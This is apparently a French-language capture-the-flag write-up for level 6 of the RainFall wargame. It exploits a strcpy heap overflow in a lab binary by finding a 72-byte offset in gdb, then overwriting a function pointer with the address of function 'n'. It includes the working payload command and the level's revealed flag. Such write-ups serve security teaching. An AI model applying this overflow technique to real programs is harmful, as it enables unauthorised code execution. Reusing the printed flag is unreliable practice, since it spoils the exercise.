# Level 6

La vulnérabilité se trouve dans la fonction strcpy, où l'on peut écrire davantage que le tampon alloué.
Ici "dest" qui est de 64 char.

Nous allons donc écraser l'adresse de retour sur le tas(malloc utilise), par l'adresse de la fonction 'n'.

```
level6@RainFall:~$ python -c 'print "a"*64' > /tmp/exploit3
level6@RainFall:~$ gdb level6
(gdb) disas main
Dump of assembler code for function main:
   0x0804847c <+0>:	push   %ebp
   0x0804847d <+1>:	mov    %esp,%ebp
   0x0804847f <+3>:	and    $0xfffffff0,%esp
   0x08048482 <+6>:	sub    $0x20,%esp
   0x08048485 <+9>:	movl   $0x40,(%esp)
   0x0804848c <+16>:	call   0x8048350 <malloc@plt>
   0x08048491 <+21>:	mov    %eax,0x1c(%esp)
   0x08048495 <+25>:	movl   $0x4,(%esp)
   0x0804849c <+32>:	call   0x8048350 <malloc@plt>
   0x080484a1 <+37>:	mov    %eax,0x18(%esp)
   0x080484a5 <+41>:	mov    $0x8048468,%edx
   0x080484aa <+46>:	mov    0x18(%esp),%eax
   0x080484ae <+50>:	mov    %edx,(%eax)
   0x080484b0 <+52>:	mov    0xc(%ebp),%eax
   0x080484b3 <+55>:	add    $0x4,%eax
   0x080484b6 <+58>:	mov    (%eax),%eax
   0x080484b8 <+60>:	mov    %eax,%edx
   0x080484ba <+62>:	mov    0x1c(%esp),%eax
   0x080484be <+66>:	mov    %edx,0x4(%esp)
   0x080484c2 <+70>:	mov    %eax,(%esp)
   0x080484c5 <+73>:	call   0x8048340 <strcpy@plt>
   0x080484ca <+78>:	mov    0x18(%esp),%eax
   0x080484ce <+82>:	mov    (%eax),%eax
   0x080484d0 <+84>:	call   *%eax
   0x080484d2 <+86>:	leave
   0x080484d3 <+87>:	ret
End of assembler dump.

(gdb) b*0x080484ca <== apres strcpy
Breakpoint 1 at 0x80484ca

(gdb) run AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz
Starting program: /home/user/level6/level6 AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz

Breakpoint 1, 0x080484ca in main ()
(gdb) x/100wx $eax
0x804a008:      0x41414141      0x42424242      0x43434343      0x44444444
0x804a018:      0x45454545      0x46464646      0x47474747      0x48484848
0x804a028:      0x49494949      0x4a4a4a4a      0x4b4b4b4b      0x4c4c4c4c
0x804a038:      0x4d4d4d4d      0x4e4e4e4e      0x4f4f4f4f      0x50505050
0x804a048:      0x51515151      0x52525252      0x53535353      0x54545454
0x804a058:      0x55555555      0x56565656      0x57575757      0x58585858
0x804a068:      0x59595959      0x5a5a5a5a      0x61616161      0x62626262
0x804a078:      0x63636363      0x64646464      0x65656565      0x66666666
0x804a088:      0x67676767      0x68686868      0x69696969      0x6a6a6a6a
0x804a098:      0x6b6b6b6b      0x6c6c6c6c      0x6d6d6d6d      0x6e6e6e6e
0x804a0a8:      0x6f6f6f6f      0x70707070      0x71717171      0x72727272
0x804a0b8:      0x73737373      0x74747474      0x75757575      0x76767676
0x804a0c8:      0x77777777      0x78787878      0x79797979      0x7a7a7a7a
0x804a0d8:      0x00000000      0x00000000      0x00000000      0x00000000
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x53535353 in ?? () <==== offset = 72
```

```
(gdb) p n
$1 = {<text variable, no debug info>} 0x8048454 <n>
```
L'adresse de n vers où jump est "0x8048454".

```
level6@RainFall:~$ python -c 'print "a"*72 + "\x54\x84\x04\x08"' > /tmp/exploit3
level6@RainFall:~$ /home/user/level6/level6 $(cat /tmp/exploit3)
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```